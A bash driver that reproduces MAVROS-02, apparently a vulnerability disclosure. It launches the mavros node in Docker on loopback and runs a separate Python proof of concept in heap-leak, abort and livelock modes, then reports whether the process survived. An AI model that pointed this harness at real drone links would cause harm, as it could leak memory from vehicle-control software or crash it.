#!/usr/bin/env bash
# MAVROS-02 reproduction driver. Runs mavros and the fake vehicle in one
# container so the MAVLink link is loopback and nothing depends on host routing.
#
#   ./run.sh leak       # heap disclosure (the headline)
#   ./run.sh abort      # single packet -> whole-process abort
#   ./run.sh livelock   # bytes_written=0 -> infinite write/ack loop
set -euo pipefail
MODE="${1:-leak}"; shift || true
docker run --rm --name mavros02 mavros02-poc bash -lc "
set -e
source /opt/ros/jazzy/setup.bash

# mavros binds 14540 and talks to the fake vehicle on 14557, both on loopback.
ros2 run mavros mavros_node --ros-args \
    -p fcu_url:=udp://127.0.0.1:14540@127.0.0.1:14557 \
    -p system_id:=1 -p component_id:=191 \
    -p target_system_id:=1 -p target_component_id:=1 \
    -r __ns:=/mavros > /tmp/mavros.log 2>&1 &
MAVROS_PID=\$!
echo \"[run] mavros_node pid=\$MAVROS_PID (log: /tmp/mavros.log)\"

python3 /poc/poc_MAVROS02_ftp_write_ack_oob.py --mode $MODE $* || true

echo ''
echo '[run] ---- is the mavros process still alive? ----'
if kill -0 \$MAVROS_PID 2>/dev/null; then
  echo \"[run] ALIVE  pid=\$MAVROS_PID\"
else
  wait \$MAVROS_PID 2>/dev/null || true
  echo \"[run] DEAD   exit=\$?\"
fi
echo '[run] ---- tail of mavros log ----'
tail -20 /tmp/mavros.log
"
